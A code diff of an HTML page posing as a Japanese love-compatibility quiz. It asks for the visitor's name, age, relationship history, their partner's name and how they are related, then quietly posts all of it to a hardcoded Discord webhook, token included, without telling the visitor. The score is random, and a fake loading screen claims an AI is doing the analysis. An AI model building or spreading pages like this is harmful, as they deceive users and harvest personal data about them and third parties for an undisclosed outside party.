@@ -4,39 +4,63 @@
     <meta charset="UTF-8">
     <title>診断</title>
     <style>
-        body { font-family: sans-serif; padding: 20px; }
-        input { display: block; width: 100%; margin: 10px 0; padding: 8px; }
-        button { padding: 10px 20px; }
+        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f0f0; }
+        .box { background: #fff; padding: 30px; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
+        input { width: 90%; padding: 10px; margin: 15px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { padding: 10px 20px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <input type="text" id="name" placeholder="名前">
-    <input type="number" id="age" placeholder="年齢">
-    <input type="text" id="exp" placeholder="恋愛経験回数">
-    <input type="text" id="partner" placeholder="相手の名前">
-    <input type="text" id="rel" placeholder="相手との関係性">
-    <button id="sendBtn">診断</button>
+    <div class="box">
+        <h2 id="title">恋愛相性診断</h2>
+        <p id="msg">開始ボタンを押してね</p>
+        <input type="text" id="inputArea" style="display:none;">
+        <button id="actionBtn">開始</button>
+    </div>
 
     <script>
-        document.getElementById('sendBtn').onclick = function() {
-            const score = Math.floor(Math.random() * (81 - 70) + 70);
-            const data = {
-                content: "結果:\n" +
-                         "名前: " + document.getElementById('name').value + "\n" +
-                         "年齢: " + document.getElementById('age').value + "\n" +
-                         "経験: " + document.getElementById('exp').value + "\n" +
-                         "相手: " + document.getElementById('partner').value + "\n" +
-                         "関係性: " + document.getElementById('rel').value + "\n" +
-                         "スコア: " + score + "%"
-            };
+        let step = 0;
+        const answers = {};
+        const questions = ["名前は？", "年齢は？", "恋愛経験回数は？", "相手の名前は？", "相手との関係は？"];
+        const keys = ["name", "age", "exp", "partner", "rel"];
 
-            fetch("https://discord.com/api/webhooks/1527564576340709377/g9wUd7Y6mbsuHE5Gx2wKsEl_LJrEBaqWJbIg90gkBEoErB8ZszsW5AyexsQ9nYP_REqV", {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            });
-            alert("診断結果: " + score + "%");
+        document.getElementById('actionBtn').onclick = () => {
+            if (step === 0) {
+                step++;
+                document.getElementById('msg').innerText = questions[0];
+                document.getElementById('inputArea').style.display = 'block';
+                document.getElementById('actionBtn').innerText = '次へ';
+            } else if (step <= questions.length) {
+                answers[keys[step - 1]] = document.getElementById('inputArea').value;
+                document.getElementById('inputArea').value = '';
+                if (step < questions.length) {
+                    document.getElementById('msg').innerText = questions[step];
+                    step++;
+                } else {
+                    showLoading();
+                }
+            }
         };
+
+        function showLoading() {
+            document.getElementById('title').innerText = "解析中...";
+            document.getElementById('msg').innerText = "AIが相性を計算しています...";
+            document.getElementById('inputArea').style.display = 'none';
+            document.getElementById('actionBtn').style.display = 'none';
+
+            // データ送信
+            const score = Math.floor(Math.random() * (81 - 70) + 70);
+            const data = { content: `結果:\n名前: ${answers.name}\n年齢: ${answers.age}\n経験: ${answers.exp}\n相手: ${answers.partner}\n関係: ${answers.rel}\nスコア: ${score}%` };
+            
+            fetch("https://discord.com/api/webhooks/1527564576340709377/g9wUd7Y6mbsuHE5Gx2wKsEl_LJrEBaqWJbIg90gkBEoErB8ZszsW5AyexsQ9nYP_REqV", {
+                method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data)
+            });
+
+            // 3秒間ロード演出をしてから結果表示
+            setTimeout(() => {
+                document.querySelector('.box').innerHTML = `<h2>診断完了</h2><p style="font-size: 2em; font-weight: bold; color: #ff6b81;">${score}%</p>`;
+            }, 3000);
+        }
     </script>
 </body>
 </html>
